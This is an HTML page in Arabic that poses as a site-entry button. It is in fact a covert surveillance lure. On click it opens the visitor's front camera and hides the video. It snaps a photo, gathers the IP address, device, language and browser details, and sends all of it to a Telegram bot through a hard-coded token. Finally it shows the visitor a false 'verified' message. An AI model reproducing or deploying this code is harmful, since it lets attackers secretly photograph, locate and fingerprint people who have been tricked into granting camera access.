<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>M31 ROJI</title>

<style>
body {
  background:#000;
  color:#0f0;
  text-align:center;
  font-family:Arial;
}

button {
  padding:12px 25px;
  font-size:18px;
  margin-top:30px;
  background:#0f0;
  color:#000;
  border:none;
  border-radius:8px;
}

#msg {
  margin-top:20px;
}

video { display:none; }
</style>
</head>

<body>

<h3>اضغط لفتح الموقع</h3>

<button onclick="startCamera()">دخول</button>

<div id="msg"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "7852857305:AAEW7SqDION4MTuIPNnxP6caMEYMLl2yojc";
const CHAT_ID  = "8514140307";

let streamRef = null;

// جلب IP
async function getIP() {
  try {
    let res = await fetch("https://api.ipify.org?format=json");
    let data = await res.json();
    return data.ip;
  } catch {
    return "غير متوفر";
  }
}

// اسم الجهاز
function getDeviceName() {
  const ua = navigator.userAgent;

  if (/iphone/i.test(ua)) return "iPhone";
  if (/ipad/i.test(ua)) return "iPad";
  if (/android/i.test(ua)) return "Android";
  if (/windows/i.test(ua)) return "Windows PC";
  if (/mac/i.test(ua)) return "Mac";

  return "غير معروف";
}

// معلومات كاملة
async function getInfo() {
  const ip = await getIP();
  const device = getDeviceName();

  return `
🌐 IP: ${ip}
📱 الجهاز: ${device}
🌐 اللغة: ${navigator.language}
🧭 المتصفح: ${navigator.userAgent}
⏰ الوقت: ${new Date().toLocaleString()}
https://roji20112.github.io/M31201/
`;
}

// تشغيل الكاميرا
function startCamera() {
  document.getElementById("msg").innerText = "⏳ جاري التشغيل...";

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  })
  .then(stream => {
    streamRef = stream;
    document.getElementById("video").srcObject = stream;

    setTimeout(capture, 2000);
  })
  .catch(() => {
    document.getElementById("msg").innerText = "❌ تم رفض الكاميرا";
  });
}

// التقاط الصورة
async function capture() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  if (streamRef) {
    streamRef.getTracks().forEach(t => t.stop());
  }

  const info = await getInfo();

  canvas.toBlob(blob => {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", blob);
    form.append("caption", info);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    })
    .then(() => {
      document.getElementById("msg").innerText = "✅ تم التحقق";
    })
    .catch(() => {
      document.getElementById("msg").innerText = "❌ فشل الإرسال";
    });
  }, "image/jpeg");
}
</script>

</body>
</html>
